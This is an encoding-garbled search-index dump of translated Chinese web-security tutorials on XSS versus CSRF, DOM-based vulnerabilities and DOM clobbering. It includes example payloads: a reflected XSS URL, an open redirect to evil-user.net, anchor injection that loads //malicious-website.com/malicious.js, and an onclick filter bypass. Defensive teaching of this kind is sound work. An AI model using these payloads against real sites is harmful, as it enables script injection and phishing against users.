åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Š XSS å’Œ CSRF ä¹‹é—´çš„åŒºåˆ«ï¼Œå¹¶è®¨è®º CSRF token æ˜¯å¦æœ‰åŠ©äºé˜²å¾¡ XSS æ”»å‡»ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/xss-vs-csrf/:0:0","tags":[],"title":"XSS vs CSRF","uri":"/translation/web-security/csrf/xss-vs-csrf/"},{"categories":["web security"],"content":"XSS å’Œ CSRF ä¹‹é—´æœ‰å•¥åŒºåˆ« è·¨ç«™è„šæœ¬æ”»å‡» XSS å…è®¸æ”»å‡»è€…åœ¨å—å®³è€…ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„ JavaScript ã€‚ è·¨ç«™è¯·æ±‚ä¼ªé€  CSRF å…è®¸æ”»å‡»è€…ä¼ªé€ å—å®³ç”¨æˆ·æ‰§è¡Œä»–ä»¬ä¸æ‰“ç®—æ‰§è¡Œçš„æ“ä½œã€‚ XSS æ¼æ´çš„åæœé€šå¸¸æ¯” CSRF æ¼æ´æ›´ä¸¥é‡ï¼š CSRF é€šå¸¸åªé€‚ç”¨äºç”¨æˆ·èƒ½å¤Ÿæ‰§è¡Œçš„æ“ä½œçš„å­é›†ã€‚é€šå¸¸ï¼Œè®¸å¤šåº”ç”¨ç¨‹åºéƒ½å®ç° CSRF é˜²å¾¡ï¼Œä½†æ˜¯å¿½ç•¥äº†æš´éœ²çš„ä¸€ä¸¤ä¸ªæ“ä½œã€‚ç›¸åï¼ŒæˆåŠŸçš„ XSS æ”»å‡»é€šå¸¸å¯ä»¥æ‰§è¡Œç”¨æˆ·èƒ½å¤Ÿæ‰§è¡Œçš„ä»»ä½•æ“ä½œï¼Œè€Œä¸ç®¡è¯¥æ¼æ´æ˜¯åœ¨ä»€ä¹ˆåŠŸèƒ½ä¸­äº§ç”Ÿçš„ã€‚ CSRF å¯ä»¥è¢«æè¿°ä¸ºä¸€ä¸ªâ€œå•å‘â€æ¼æ´ï¼Œå› ä¸ºå°½ç®¡æ”»å‡»è€…å¯ä»¥è¯±å¯¼å—å®³è€…å‘å‡º HTTP è¯·æ±‚ï¼Œä½†ä»–ä»¬æ— æ³•ä»è¯¥è¯·æ±‚ä¸­æ£€ç´¢å“åº”ã€‚ç›¸åï¼ŒXSS æ˜¯â€œåŒå‘â€çš„ï¼Œå› ä¸ºæ”»å‡»è€…æ³¨å…¥çš„è„šæœ¬å¯ä»¥å‘å‡ºä»»æ„è¯·æ±‚ã€è¯»å–å“åº”å¹¶å°†æ•°æ®ä¼ è¾“åˆ°æ”»å‡»è€…é€‰æ‹©çš„å¤–éƒ¨åŸŸã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/xss-vs-csrf/:1:0","tags":[],"title":"XSS vs CSRF","uri":"/translation/web-security/csrf/xss-vs-csrf/"},{"categories":["web security"],"content":"CSRF token èƒ½å¦é˜²å¾¡ XSS æ”»å‡» ä¸€äº› XSS æ”»å‡»ç¡®å®å¯ä»¥é€šè¿‡æœ‰æ•ˆä½¿ç”¨ CSRF token æ¥è¿›è¡Œé˜²å¾¡ã€‚å‡è®¾æœ‰ä¸€ä¸ªç®€å•çš„åå°„å‹ XSS æ¼æ´ï¼Œå…¶å¯ä»¥è¢«åˆ©ç”¨å¦‚ä¸‹ï¼š https://insecure-website.com/status?message=\u003cscript\u003e/*+Bad+stuff+here...+*/\u003c/script\u003e ç°åœ¨ï¼Œå‡è®¾æ¼æ´å‡½æ•°åŒ…å«ä¸€ä¸ª CSRF token : https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz\u0026message=\u003cscript\u003e/*+Bad+stuff+here...+*/\u003c/script\u003e å¦‚æœæœåŠ¡å™¨æ­£ç¡®åœ°éªŒè¯äº† CSRF token ï¼Œå¹¶æ‹’ç»äº†æ²¡æœ‰æœ‰æ•ˆä»¤ç‰Œçš„è¯·æ±‚ï¼Œé‚£ä¹ˆè¯¥ä»¤ç‰Œç¡®å®å¯ä»¥é˜²æ­¢æ­¤ XSS æ¼æ´çš„åˆ©ç”¨ã€‚è¿™é‡Œçš„å…³é”®ç‚¹æ˜¯â€œè·¨ç«™è„šæœ¬â€çš„æ”»å‡»ä¸­æ¶‰åŠåˆ°äº†è·¨ç«™è¯·æ±‚ï¼Œå› æ­¤é€šè¿‡é˜²æ­¢æ”»å‡»è€…ä¼ªé€ è·¨ç«™è¯·æ±‚ï¼Œè¯¥åº”ç”¨ç¨‹åºå¯é˜²æ­¢å¯¹ XSS æ¼æ´çš„è½»åº¦æ”»å‡»ã€‚ è¿™é‡Œæœ‰ä¸€äº›é‡è¦çš„æ³¨æ„äº‹é¡¹ï¼š å¦‚æœåå°„å‹ XSS æ¼æ´å­˜åœ¨äºç«™ç‚¹ä¸Šä»»ä½•å…¶ä»–ä¸å— CSRF token ä¿æŠ¤çš„å‡½æ•°å†…ï¼Œåˆ™å¯ä»¥ä»¥å¸¸è§„æ–¹å¼åˆ©ç”¨è¯¥ XSS æ¼æ´ã€‚ å¦‚æœç«™ç‚¹ä¸Šçš„ä»»ä½•åœ°æ–¹éƒ½å­˜åœ¨å¯åˆ©ç”¨çš„ XSS æ¼æ´ï¼Œåˆ™å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ä½¿å—å®³ç”¨æˆ·æ‰§è¡Œæ“ä½œï¼Œå³ä½¿è¿™äº›æ“ä½œæœ¬èº«å—åˆ° CSRF token çš„ä¿æŠ¤ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…çš„è„šæœ¬å¯ä»¥è¯·æ±‚ç›¸å…³é¡µé¢è·å–æœ‰æ•ˆçš„ CSRF tokenï¼Œç„¶åä½¿ç”¨è¯¥ä»¤ç‰Œæ‰§è¡Œå—ä¿æŠ¤çš„æ“ä½œã€‚ CSRF token ä¸ä¿æŠ¤å­˜å‚¨å‹ XSS æ¼æ´ã€‚å¦‚æœå— CSRF token ä¿æŠ¤çš„é¡µé¢ä¹Ÿæ˜¯å­˜å‚¨å‹ XSS æ¼æ´çš„è¾“å‡ºç‚¹ï¼Œåˆ™å¯ä»¥ä»¥é€šå¸¸çš„æ–¹å¼åˆ©ç”¨è¯¥ XSS æ¼æ´ï¼Œå¹¶ä¸”å½“ç”¨æˆ·è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œå°†æ‰§è¡Œ XSS æœ‰æ•ˆè´Ÿè½½ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/xss-vs-csrf/:2:0","tags":[],"title":"XSS vs CSRF","uri":"/translation/web-security/csrf/xss-vs-csrf/"},{"categories":["web security"],"content":"web å®‰å…¨ä¹‹ DOM-based vulnerabilities","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-based-vulnerabilities/","tags":[],"title":"web å®‰å…¨ä¹‹ DOM-based vulnerabilities","uri":"/translation/web-security/dom-based/dom-based-vulnerabilities/"},{"categories":["web security"],"content":"DOM-based vulnerabilities åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æè¿°ä»€ä¹ˆæ˜¯ DOM ï¼Œè§£é‡Šå¯¹ DOM æ•°æ®çš„ä¸å®‰å…¨å¤„ç†æ˜¯å¦‚ä½•å¼•å…¥æ¼æ´çš„ï¼Œå¹¶å»ºè®®å¦‚ä½•åœ¨æ‚¨çš„ç½‘ç«™ä¸Šé˜²æ­¢åŸºäº DOM çš„æ¼æ´ã€‚ ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-based-vulnerabilities/:0:0","tags":[],"title":"web å®‰å…¨ä¹‹ DOM-based vulnerabilities","uri":"/translation/web-security/dom-based/dom-based-vulnerabilities/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯ DOM Document Object Modelï¼ˆDOMï¼‰æ–‡æ¡£å¯¹è±¡æ¨¡å‹æ˜¯ web æµè§ˆå™¨å¯¹é¡µé¢ä¸Šå…ƒç´ çš„å±‚æ¬¡è¡¨ç¤ºã€‚ç½‘ç«™å¯ä»¥ä½¿ç”¨ JavaScript æ¥æ“ä½œ DOM çš„èŠ‚ç‚¹å’Œå¯¹è±¡ï¼Œä»¥åŠå®ƒä»¬çš„å±æ€§ã€‚DOM æ“ä½œæœ¬èº«ä¸æ˜¯é—®é¢˜ï¼Œäº‹å®ä¸Šï¼Œå®ƒä¹Ÿæ˜¯ç°ä»£ç½‘ç«™ä¸­ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ã€‚ç„¶è€Œï¼Œä¸å®‰å…¨åœ°å¤„ç†æ•°æ®çš„ JavaScript å¯èƒ½ä¼šå¼•å‘å„ç§æ”»å‡»ã€‚å½“ç½‘ç«™åŒ…å«çš„ JavaScript æ¥å—æ”»å‡»è€…å¯æ§åˆ¶çš„å€¼ï¼ˆç§°ä¸º source æºï¼‰å¹¶å°†å…¶ä¼ é€’ç»™ä¸€ä¸ªå±é™©å‡½æ•°ï¼ˆç§°ä¸º sink æ¥æ”¶å™¨ï¼‰æ—¶ï¼Œå°±ä¼šå‡ºç°åŸºäº DOM çš„æ¼æ´ã€‚ ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-based-vulnerabilities/:1:0","tags":[],"title":"web å®‰å…¨ä¹‹ DOM-based vulnerabilities","uri":"/translation/web-security/dom-based/dom-based-vulnerabilities/"},{"categories":["web security"],"content":"æ±¡æŸ“æµæ¼æ´ è®¸å¤šåŸºäº DOM çš„æ¼æ´å¯ä»¥è¿½æº¯åˆ°å®¢æˆ·ç«¯ä»£ç åœ¨å¤„ç†æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„æ•°æ®æ—¶å­˜åœ¨é—®é¢˜ã€‚ ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-based-vulnerabilities/:2:0","tags":[],"title":"web å®‰å…¨ä¹‹ DOM-based vulnerabilities","uri":"/translation/web-security/dom-based/dom-based-vulnerabilities/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯æ±¡æŸ“æµ è¦åˆ©ç”¨æˆ–è€…ç¼“è§£è¿™äº›æ¼æ´ï¼Œé¦–å…ˆè¦ç†Ÿæ‚‰ source æºä¸ sink æ¥æ”¶å™¨ä¹‹é—´çš„æ±¡æŸ“æµçš„åŸºæœ¬æ¦‚å¿µã€‚ Source æºæ˜¯ä¸€ä¸ª JavaScript å±æ€§ï¼Œå®ƒæ¥å—å¯èƒ½ç”±æ”»å‡»è€…æ§åˆ¶çš„æ•°æ®ã€‚æºçš„ä¸€ä¸ªç¤ºä¾‹æ˜¯ location.search å±æ€§ï¼Œå› ä¸ºå®ƒä» query å­—ç¬¦ä¸²ä¸­è¯»å–è¾“å…¥ï¼Œè¿™å¯¹äºæ”»å‡»è€…æ¥è¯´æ¯”è¾ƒå®¹æ˜“æ§åˆ¶ã€‚æ€»ä¹‹ï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„ä»»ä½•å±æ€§éƒ½æ˜¯æ½œåœ¨çš„æºã€‚åŒ…æ‹¬å¼•ç”¨ URLï¼ˆ document.referrer ï¼‰ã€ç”¨æˆ·çš„ cookiesï¼ˆ document.cookie ï¼‰å’Œ web messages ã€‚ Sink æ¥æ”¶å™¨æ˜¯å­˜åœ¨æ½œåœ¨å±é™©çš„ JavaScript å‡½æ•°æˆ–è€… DOM å¯¹è±¡ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶çš„æ•°æ®è¢«ä¼ é€’ç»™å®ƒä»¬ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä¸è‰¯åæœã€‚ä¾‹å¦‚ï¼Œeval() å‡½æ•°å°±æ˜¯ä¸€ä¸ª sink ï¼Œå› ä¸ºå…¶æŠŠä¼ é€’ç»™å®ƒçš„å‚æ•°å½“ä½œ JavaScript ç›´æ¥æ‰§è¡Œã€‚ä¸€ä¸ª HTML sink çš„ç¤ºä¾‹æ˜¯ document.body.innerHTML ï¼Œå› ä¸ºå®ƒå¯èƒ½å…è®¸æ”»å‡»è€…æ³¨å…¥æ¶æ„ HTML å¹¶æ‰§è¡Œä»»æ„ JavaScriptã€‚ ä»æ ¹æœ¬ä¸Šè®²ï¼Œå½“ç½‘ç«™å°†æ•°æ®ä» source æºä¼ é€’åˆ° sink æ¥æ”¶å™¨ï¼Œä¸”æ¥æ”¶å™¨éšååœ¨å®¢æˆ·ç«¯ä¼šè¯çš„ä¸Šä¸‹æ–‡ä¸­ä»¥ä¸å®‰å…¨çš„æ–¹å¼å¤„ç†æ•°æ®æ—¶ï¼ŒåŸºäº DOM çš„æ¼æ´å°±ä¼šå‡ºç°ã€‚ æœ€å¸¸è§çš„ source æºå°±æ˜¯ URL ï¼Œå…¶å¯ä»¥é€šè¿‡ location å¯¹è±¡è®¿é—®ã€‚æ”»å‡»è€…å¯ä»¥æ„å»ºä¸€ä¸ªé“¾æ¥ï¼Œä»¥è®©å—å®³è€…è®¿é—®æ˜“å—æ”»å‡»çš„é¡µé¢ï¼Œå¹¶åœ¨ URL çš„ query å­—ç¬¦ä¸²å’Œ fragment éƒ¨åˆ†æ·»åŠ æœ‰æ•ˆè´Ÿè½½ã€‚è€ƒè™‘ä»¥ä¸‹ä»£ç ï¼š goto = location.hash.slice(1) if(goto.startsWith('https:')) { location = goto; } è¿™æ˜¯ä¸€ä¸ªåŸºäº DOM çš„å¼€æ”¾é‡å®šå‘æ¼æ´ï¼Œå› ä¸º location.hash æºè¢«ä»¥ä¸å®‰å…¨çš„æ–¹å¼å¤„ç†ã€‚è¿™ä¸ªä»£ç çš„æ„æ€æ˜¯ï¼Œå¦‚æœ URL çš„ fragment éƒ¨åˆ†ä»¥ https å¼€å¤´ï¼Œåˆ™æå–å½“å‰ location.hash çš„å€¼ï¼Œå¹¶è®¾ç½®ä¸º window çš„ location ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ å¦‚ä¸‹çš„ URL æ¥åˆ©ç”¨æ­¤æ¼æ´ï¼š https://www.innocent-website.com/example#https://www.evil-user.net å½“å—å®³è€…è®¿é—®æ­¤ URL æ—¶ï¼ŒJavaScript å°±ä¼šå°† location è®¾ç½®ä¸º www.evil-user.net ï¼Œä¹Ÿå°±æ˜¯è‡ªåŠ¨è·³è½¬åˆ°äº†æ¶æ„ç½‘å€ã€‚è¿™ç§æ¼æ´éå¸¸å®¹æ˜“è¢«ç”¨æ¥è¿›è¡Œé’“é±¼æ”»å‡»ã€‚ ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-based-vulnerabilities/:2:1","tags":[],"title":"web å®‰å…¨ä¹‹ DOM-based vulnerabilities","uri":"/translation/web-security/dom-based/dom-based-vulnerabilities/"},{"categories":["web security"],"content":"å¸¸è§çš„ source æº ä»¥ä¸‹æ˜¯ä¸€äº›å¯ç”¨äºå„ç§æ±¡æŸ“æµæ¼æ´çš„å¸¸è§çš„ source æºï¼š document.URL document.documentURI document.URLUnencoded document.baseURI location document.cookie document.referrer window.name history.pushState history.replaceState localStorage sessionStorage IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) Database ä»¥ä¸‹æ•°æ®ä¹Ÿå¯ä»¥è¢«ç”¨ä½œæ±¡æŸ“æµæ¼æ´çš„ source æºï¼š Reflected data åå°„æ•°æ® Stored data å­˜å‚¨æ•°æ® Web messages ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-based-vulnerabilities/:2:2","tags":[],"title":"web å®‰å…¨ä¹‹ DOM-based vulnerabilities","uri":"/translation/web-security/dom-based/dom-based-vulnerabilities/"},{"categories":["web security"],"content":"å“ªäº› sink æ¥æ”¶å™¨ä¼šå¯¼è‡´åŸºäº DOM çš„æ¼æ´ ä¸‹é¢çš„åˆ—è¡¨æä¾›äº†åŸºäº DOM çš„å¸¸è§æ¼æ´çš„å¿«é€Ÿæ¦‚è¿°ï¼Œå¹¶æä¾›äº†å¯¼è‡´æ¯ä¸ªæ¼æ´çš„ sink ç¤ºä¾‹ã€‚æœ‰å…³æ¯ä¸ªæ¼æ´çš„è¯¦æƒ…è¯·æŸ¥é˜…æœ¬ç³»åˆ—æ–‡ç« çš„ç›¸å…³éƒ¨åˆ†ã€‚ åŸºäº DOM çš„æ¼æ´ sink ç¤ºä¾‹ DOM XSS document.write() Open redirection window.location Cookie manipulation document.cookie JavaScript injection eval() Document-domain manipulation document.domain WebSocket-URL poisoning WebSocket() Link manipulation someElement.src Web-message manipulation postMessage() Ajax request-header manipulation setRequestHeader() Local file-path manipulation FileReader.readAsText() Client-side SQL injection ExecuteSql() HTML5-storage manipulation sessionStorage.setItem() Client-side XPath injection document.evaluate() Client-side JSON injection JSON.parse() DOM-data manipulation someElement.setAttribute() Denial of service RegExp() ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-based-vulnerabilities/:2:3","tags":[],"title":"web å®‰å…¨ä¹‹ DOM-based vulnerabilities","uri":"/translation/web-security/dom-based/dom-based-vulnerabilities/"},{"categories":["web security"],"content":"å¦‚ä½•é˜²æ­¢åŸºäº DOM çš„æ±¡æŸ“æµæ¼æ´ æ²¡æœ‰ä¸€ä¸ªå•ç‹¬çš„æ“ä½œå¯ä»¥å®Œå…¨æ¶ˆé™¤åŸºäº DOM çš„æ”»å‡»çš„å¨èƒã€‚ç„¶è€Œï¼Œä¸€èˆ¬æ¥è¯´ï¼Œé¿å…åŸºäº DOM çš„æ¼æ´çš„æœ€æœ‰æ•ˆæ–¹æ³•æ˜¯é¿å…å…è®¸æ¥è‡ªä»»ä½•ä¸å¯ä¿¡ source æºçš„æ•°æ®åŠ¨æ€æ›´æ”¹ä¼ è¾“åˆ°ä»»ä½• sink æ¥æ”¶å™¨çš„å€¼ã€‚ å¦‚æœåº”ç”¨ç¨‹åºæ‰€éœ€çš„åŠŸèƒ½æ„å‘³ç€è¿™ç§è¡Œä¸ºæ˜¯ä¸å¯é¿å…çš„ï¼Œåˆ™å¿…é¡»åœ¨å®¢æˆ·ç«¯ä»£ç å†…å®æ–½é˜²å¾¡æªæ–½ã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œå¯ä»¥æ ¹æ®ç™½åå•æ¥éªŒè¯ç›¸å…³æ•°æ®ï¼Œä»…å…è®¸å·²çŸ¥å®‰å…¨çš„å†…å®¹ã€‚åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œæœ‰å¿…è¦å¯¹æ•°æ®è¿›è¡Œæ¸…ç†æˆ–ç¼–ç ã€‚è¿™å¯èƒ½æ˜¯ä¸€é¡¹å¤æ‚çš„ä»»åŠ¡ï¼Œå¹¶ä¸”å–å†³äºè¦æ’å…¥æ•°æ®çš„ä¸Šä¸‹æ–‡ï¼Œå®ƒå¯èƒ½éœ€è¦æŒ‰ç…§é€‚å½“çš„é¡ºåºè¿›è¡Œ JavaScript è½¬ä¹‰ï¼ŒHTML ç¼–ç å’Œ URL ç¼–ç ã€‚ æœ‰å…³é˜²æ­¢ç‰¹å®šæ¼æ´çš„æªæ–½ï¼Œè¯·å‚é˜…ä¸Šè¡¨é“¾æ¥çš„ç›¸åº”æ¼æ´é¡µé¢ã€‚ ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-based-vulnerabilities/:2:4","tags":[],"title":"web å®‰å…¨ä¹‹ DOM-based vulnerabilities","uri":"/translation/web-security/dom-based/dom-based-vulnerabilities/"},{"categories":["web security"],"content":"DOM clobbering DOM clobbering æ˜¯ä¸€ç§é«˜çº§æŠ€æœ¯ï¼Œå…·ä½“è€Œè¨€å°±æ˜¯ä½ å¯ä»¥å°† HTML æ³¨å…¥åˆ°é¡µé¢ä¸­ï¼Œä»è€Œæ“ä½œ DOM ï¼Œå¹¶æœ€ç»ˆæ”¹å˜ç½‘ç«™ä¸Š JavaScript çš„è¡Œä¸ºã€‚DOM clobbering æœ€å¸¸è§çš„å½¢å¼æ˜¯ä½¿ç”¨ anchor å…ƒç´ è¦†ç›–å…¨å±€å˜é‡ï¼Œç„¶åè¯¥å˜é‡å°†ä¼šè¢«åº”ç”¨ç¨‹åºä»¥ä¸å®‰å…¨çš„æ–¹å¼ä½¿ç”¨ï¼Œä¾‹å¦‚ç”ŸæˆåŠ¨æ€è„šæœ¬ URL ã€‚ ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-based-vulnerabilities/:3:0","tags":[],"title":"web å®‰å…¨ä¹‹ DOM-based vulnerabilities","uri":"/translation/web-security/dom-based/dom-based-vulnerabilities/"},{"categories":["web security"],"content":"DOM clobbering","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-clobbering/","tags":[],"title":"DOM clobbering","uri":"/translation/web-security/dom-based/dom-clobbering/"},{"categories":["web security"],"content":"DOM clobbering åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æè¿°ä»€ä¹ˆæ˜¯ DOM clobbing ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ clobbing æŠ€æœ¯æ¥åˆ©ç”¨ DOM æ¼æ´ï¼Œå¹¶æå‡ºé˜²å¾¡ DOM clobbing æ”»å‡»çš„æ–¹æ³•ã€‚ ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-clobbering/:0:0","tags":[],"title":"DOM clobbering","uri":"/translation/web-security/dom-based/dom-clobbering/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯ DOM clobbering DOM clobbering æ˜¯ä¸€ç§å°† HTML æ³¨å…¥é¡µé¢ä»¥æ“ä½œ DOM å¹¶æœ€ç»ˆæ”¹å˜é¡µé¢ä¸Š JavaScript è¡Œä¸ºçš„æŠ€æœ¯ã€‚åœ¨æ— æ³•ä½¿ç”¨ XSS ï¼Œä½†æ˜¯å¯ä»¥æ§åˆ¶é¡µé¢ä¸Š HTML ç™½åå•å±æ€§å¦‚ id æˆ– name æ—¶ï¼ŒDOM clobbering å°±ç‰¹åˆ«æœ‰ç”¨ã€‚DOM clobbering æœ€å¸¸è§çš„å½¢å¼æ˜¯ä½¿ç”¨ anchor å…ƒç´ è¦†ç›–å…¨å±€å˜é‡ï¼Œç„¶åè¯¥å˜é‡å°†ä¼šè¢«åº”ç”¨ç¨‹åºä»¥ä¸å®‰å…¨çš„æ–¹å¼ä½¿ç”¨ï¼Œä¾‹å¦‚ç”ŸæˆåŠ¨æ€è„šæœ¬ URL ã€‚ æœ¯è¯­ clobbing æ¥è‡ªä»¥ä¸‹äº‹å®ï¼šä½ æ­£åœ¨ â€œclobbingâ€ï¼ˆç ´åï¼‰ ä¸€ä¸ªå…¨å±€å˜é‡æˆ–å¯¹è±¡å±æ€§ï¼Œå¹¶ç”¨ DOM èŠ‚ç‚¹æˆ– HTML é›†åˆå»è¦†ç›–å®ƒã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ DOM å¯¹è±¡è¦†ç›–å…¶ä»– JavaScript å¯¹è±¡å¹¶åˆ©ç”¨è¯¸å¦‚ submit è¿™æ ·ä¸å®‰å…¨çš„åç§°ï¼Œå»å¹²æ‰°è¡¨å•çœŸæ­£çš„ submit() å‡½æ•°ã€‚ ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-clobbering/:1:0","tags":[],"title":"DOM clobbering","uri":"/translation/web-security/dom-based/dom-clobbering/"},{"categories":["web security"],"content":"å¦‚ä½•åˆ©ç”¨ DOM-clobbering æ¼æ´ æŸäº› JavaScript å¼€å‘è€…ç»å¸¸ä¼šä½¿ç”¨ä»¥ä¸‹æ¨¡å¼ï¼š var someObject = window.someObject || {}; å¦‚æœä½ èƒ½æ§åˆ¶é¡µé¢ä¸Šçš„æŸäº› HTML ï¼Œä½ å°±å¯ä»¥ç ´å someObject å¼•ç”¨ä¸€ä¸ª DOM èŠ‚ç‚¹ï¼Œä¾‹å¦‚ anchor ã€‚è€ƒè™‘å¦‚ä¸‹ä»£ç ï¼š \u003cscript\u003e window.onload = function(){ let someObject = window.someObject || {}; let script = document.createElement('script'); script.src = someObject.url; document.body.appendChild(script); }; \u003c/script\u003e è¦åˆ©ç”¨æ­¤æ˜“å—æ”»å‡»çš„ä»£ç ï¼Œä½ å¯ä»¥æ³¨å…¥ä»¥ä¸‹ HTML å»ç ´å someObject å¼•ç”¨ä¸€ä¸ª anchor å…ƒç´ ï¼š \u003ca id=someObject\u003e\u003ca id=someObject name=url href=//malicious-website.com/malicious.js\u003e ç”±äºä½¿ç”¨äº†ä¸¤ä¸ªç›¸åŒçš„ ID ï¼Œå› æ­¤ DOM ä¼šæŠŠä»–ä»¬å½’ä¸ºä¸€ä¸ªé›†åˆï¼Œç„¶å DOM ç ´åå‘é‡ä¼šä½¿ç”¨æ­¤é›†åˆè¦†ç›– someObject å¼•ç”¨ã€‚åœ¨æœ€åä¸€ä¸ª anchor å…ƒç´ ä¸Šä½¿ç”¨äº† name å±æ€§ï¼Œä»¥ç ´å someObject å¯¹è±¡çš„ url å±æ€§ï¼Œä»è€ŒæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨è„šæœ¬ã€‚ å¦ä¸€ç§å¸¸è§æ–¹æ³•æ˜¯ä½¿ç”¨ form å…ƒç´ ä»¥åŠ input å…ƒç´ å»ç ´å DOM å±æ€§ã€‚ä¾‹å¦‚ï¼Œç ´å attributes å±æ€§ä»¥ä½¿ä½ èƒ½å¤Ÿé€šè¿‡ç›¸å…³çš„å®¢æˆ·ç«¯è¿‡æ»¤å™¨ã€‚å°½ç®¡è¿‡æ»¤å™¨å°†æšä¸¾ attributes å±æ€§ï¼Œä½†å®é™…ä¸Šä¸ä¼šåˆ é™¤ä»»ä½•å±æ€§ï¼Œå› ä¸ºè¯¥å±æ€§å·²ç»è¢« DOM èŠ‚ç‚¹ç ´åã€‚ç»“æœå°±æ˜¯ï¼Œä½ å°†èƒ½å¤Ÿæ³¨å…¥é€šå¸¸ä¼šè¢«è¿‡æ»¤æ‰çš„æ¶æ„å±æ€§ã€‚ä¾‹å¦‚ï¼Œè€ƒè™‘ä»¥ä¸‹æ³¨å…¥ï¼š \u003cform onclick=alert(1)\u003e\u003cinput id=attributes\u003eClick me åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯è¿‡æ»¤å™¨å°†éå† DOM å¹¶é‡åˆ°ä¸€ä¸ªåˆ—å…¥ç™½åå•çš„ form å…ƒç´ ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿‡æ»¤å™¨å°†å¾ªç¯éå† form å…ƒç´ çš„ attributes å±æ€§ï¼Œå¹¶åˆ é™¤æ‰€æœ‰åˆ—å…¥é»‘åå•çš„å±æ€§ã€‚ä½†æ˜¯ï¼Œç”±äº attributes å±æ€§å·²ç»è¢« input å…ƒç´ ç ´åï¼Œæ‰€ä»¥è¿‡æ»¤å™¨å°†ä¼šæ”¹ä¸ºéå† input å…ƒç´ ã€‚ç”±äº input å…ƒç´ çš„é•¿åº¦ä¸ç¡®å®šï¼Œå› æ­¤è¿‡æ»¤å™¨ for å¾ªç¯çš„æ¡ä»¶ï¼ˆä¾‹å¦‚ i \u003c element.attributes.lengthï¼‰ä¸æ»¡è¶³ï¼Œè¿‡æ»¤å™¨ä¼šç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚è¿™å°†å¯¼è‡´ onclick äº‹ä»¶è¢«è¿‡æ»¤å™¨å¿½ç•¥ï¼Œå…¶å°†ä¼šåœ¨æµè§ˆå™¨ä¸­è°ƒç”¨ alert() æ–¹æ³•ã€‚ ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-clobbering/:2:0","tags":[],"title":"DOM clobbering","uri":"/translation/web-security/dom-based/dom-clobbering/"},{"categories":["web security"],"content":"å¦‚ä½•é˜²å¾¡ DOM-clobbering æ”»å‡» ç®€è€Œè¨€ä¹‹ï¼Œä½ å¯ä»¥é€šè¿‡æ£€æŸ¥ä»¥ç¡®ä¿å¯¹è±¡æˆ–å‡½æ•°ç¬¦åˆä½ çš„é¢„æœŸï¼Œæ¥é˜²å¾¡ DOM-clobbering æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥æ£€æŸ¥ DOM èŠ‚ç‚¹çš„å±æ€§æ˜¯å¦æ˜¯ NamedNodeMap çš„å®ä¾‹ï¼Œä»è€Œç¡®ä¿è¯¥å±æ€§æ˜¯ attributes å±æ€§è€Œä¸æ˜¯ç ´åçš„ HTML å…ƒç´ ã€‚ ä½ è¿˜åº”è¯¥é¿å…å…¨å±€å˜é‡ä¸æˆ–è¿ç®—ç¬¦ || ä¸€èµ·å¼•ç”¨ï¼Œå› ä¸ºè¿™å¯èƒ½å¯¼è‡´ DOM clobbering æ¼æ´ã€‚ æ€»ä¹‹ï¼š æ£€æŸ¥å¯¹è±¡å’ŒåŠŸèƒ½æ˜¯å¦åˆæ³•ã€‚å¦‚æœè¦è¿‡æ»¤ DOM ï¼Œè¯·ç¡®ä¿æ£€æŸ¥çš„å¯¹è±¡æˆ–å‡½æ•°ä¸æ˜¯ DOM èŠ‚ç‚¹ã€‚ é¿å…åçš„ä»£ç æ¨¡å¼ã€‚é¿å…å°†å…¨å±€å˜é‡ä¸é€»è¾‘ OR è¿ç®—ç¬¦ç»“åˆä½¿ç”¨ã€‚ ä½¿ç”¨ç»è¿‡è‰¯å¥½æµ‹è¯•çš„åº“ï¼Œä¾‹å¦‚ DOMPurify åº“ï¼Œè¿™ä¹Ÿå¯ä»¥è§£å†³ DOM clobbering æ¼æ´çš„é—®é¢˜ã€‚ ","date":"2021-03-07","objectID":"/translation/web-security/dom-based/dom-clobbering/:3:0","tags":[],"title":"DOM 